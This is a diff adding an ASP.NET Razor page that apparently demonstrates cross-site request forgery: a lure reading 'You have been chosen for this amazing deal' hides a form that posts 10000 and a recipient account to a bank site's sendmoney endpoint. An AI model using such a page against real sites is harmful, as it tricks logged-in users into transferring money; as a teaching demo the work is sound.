@@ -1,0 +1,15 @@
+﻿@{
+    ViewBag.Title = "Home Page";
+}
+
+
+<div>You have been chosen for this amazing deal</div>
+
+
+<form action="http://trustmebank.azurewebsites.net/home/sendmoney" method="POST">
+    @Html.Hidden("amount", 10000)
+    @Html.Hidden("recipient", "NIGRE,098374509837450239847502398475")
+    <button type="submit" >
+        click here!!
+    </button>
+</form>
